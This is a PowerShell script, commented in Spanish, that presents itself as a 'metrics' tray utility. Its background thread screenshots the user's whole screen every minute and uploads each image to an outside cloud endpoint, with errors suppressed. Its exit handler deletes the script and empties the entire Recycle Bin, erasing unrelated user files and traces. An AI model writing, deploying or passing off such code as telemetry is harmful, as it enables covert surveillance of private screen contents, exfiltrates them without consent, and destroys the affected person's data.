# Configuración
$url = "https://windows-metrics-389205780371.us-east1.run.app/metrics"
$tempPath = "$env:TEMP\screenshot.png"
$intervaloSegundos = 60 # 1 minuto

# Cargar librerías
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# NotifyIcon
$sysTrayIcon = New-Object System.Windows.Forms.NotifyIcon
$sysTrayIcon.Icon = [System.Drawing.SystemIcons]::Application
$sysTrayIcon.Text = "Mi Script de Métricas"
$sysTrayIcon.Visible = $true

$contextMenu = New-Object System.Windows.Forms.ContextMenuStrip
$exitAction = $contextMenu.Items.Add("Salir")
$exitAction.add_Click({
    $sysTrayIcon.Visible = $false

    # Autodestruir el script
    $scriptPath = $MyInvocation.ScriptName
    if (-not $scriptPath) { $scriptPath = $PSCommandPath }

    if ($scriptPath -and (Test-Path $scriptPath)) {
        # Mover a la papelera
        $shell = New-Object -ComObject Shell.Application
        $folder = $shell.Namespace((Split-Path $scriptPath))
        $item = $folder.ParseName((Split-Path $scriptPath -Leaf))
        $item.InvokeVerb("delete")

        # Vaciar la papelera
        Start-Sleep -Milliseconds 500
        $shell.Namespace(10).Items() | ForEach-Object { $_.InvokeVerb("delete") }
    }

    [System.Windows.Forms.Application]::Exit()
    exit
})
$sysTrayIcon.ContextMenuStrip = $contextMenu

# Lógica de métricas en hilo secundario
$scriptBlock = {
    param($url, $tempPath, $intervaloSegundos)

    while ($true) {
        try {
            $screen = [System.Windows.Forms.Screen]::PrimaryScreen
            $bounds = $screen.Bounds

            $bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
            $graphics = [System.Drawing.Graphics]::FromImage($bmp)
            $graphics.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size)

            $bmp.Save($tempPath, [System.Drawing.Imaging.ImageFormat]::Png)
            $graphics.Dispose()
            $bmp.Dispose()

            $fileBytes = [System.IO.File]::ReadAllBytes($tempPath)
            $fileName  = [System.IO.Path]::GetFileName($tempPath)

            $boundary = [System.Guid]::NewGuid().ToString()
            $body = (
                "--$boundary`r`n" +
                "Content-Disposition: form-data; name=`"image`"; filename=`"$fileName`"`r`n" +
                "Content-Type: image/png`r`n`r`n" +
                [System.Text.Encoding]::GetEncoding("ISO-8859-1").GetString($fileBytes) + "`r`n" +
                "--$boundary--`r`n"
            )

            Invoke-RestMethod -Uri $url -Method Post -Body $body -ContentType "multipart/form-data; boundary=$boundary" | Out-Null
        }
        catch {}

        Start-Sleep -Seconds $intervaloSegundos
    }
}

$scriptThread = [System.Threading.Thread]::new([System.Threading.ThreadStart]{
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing

    $url              = "https://windows-metrics-389205780371.us-east1.run.app/metrics"
    $tempPath         = "$env:TEMP\screenshot.png"
    $intervaloSegundos = 60

    while ($true) {
        try {
            $screen   = [System.Windows.Forms.Screen]::PrimaryScreen
            $bounds   = $screen.Bounds
            $bmp      = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
            $graphics = [System.Drawing.Graphics]::FromImage($bmp)
            $graphics.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size)
            $bmp.Save($tempPath, [System.Drawing.Imaging.ImageFormat]::Png)
            $graphics.Dispose()
            $bmp.Dispose()

            $fileBytes = [System.IO.File]::ReadAllBytes($tempPath)
            $fileName  = [System.IO.Path]::GetFileName($tempPath)
            $boundary  = [System.Guid]::NewGuid().ToString()
            $body = (
                "--$boundary`r`n" +
                "Content-Disposition: form-data; name=`"image`"; filename=`"$fileName`"`r`n" +
                "Content-Type: image/png`r`n`r`n" +
                [System.Text.Encoding]::GetEncoding("ISO-8859-1").GetString($fileBytes) + "`r`n" +
                "--$boundary--`r`n"
            )
            Invoke-RestMethod -Uri $url -Method Post -Body $body -ContentType "multipart/form-data; boundary=$boundary" | Out-Null
        }
        catch {}

        Start-Sleep -Seconds $intervaloSegundos
    }
})
$scriptThread.IsBackground = $true
$scriptThread.Start()

# Mantener la bandeja activa
[System.Windows.Forms.Application]::Run()
